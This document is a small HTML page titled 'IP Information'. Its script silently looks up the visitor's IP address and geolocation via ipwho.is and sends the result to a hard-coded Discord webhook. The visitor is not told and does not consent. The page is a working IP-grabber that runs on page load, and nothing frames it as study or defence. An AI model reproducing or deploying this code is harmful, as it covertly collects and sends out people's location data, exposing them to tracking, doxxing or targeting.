<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>IP Information</title>
</head>
<body>
<script>
let FINALL = "";

const WEBHOOK_URL = "https://discord.com/api/webhooks/1564969198948589728/bhXE0ehqTxTRlPzDHtj9askJxYN4BYI9kE5XH2yEFprDrcwiDWUOLgHdDdN9s88_G-7L";

fetch("https://ipwho.is/")
.then(response => {
    if (!response.ok) throw new Error("Request failed");
    return response.text();
})
.then(text => {
    FINALL = text;

    return fetch(WEBHOOK_URL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: FINALL
        })
    });
})
.then(response => {
    if (!response.ok) throw new Error("Webhook request failed");
    console.log("Sent successfully!");
})
.catch(error => {
    console.error(error);
});
</script>
</body>
</html>
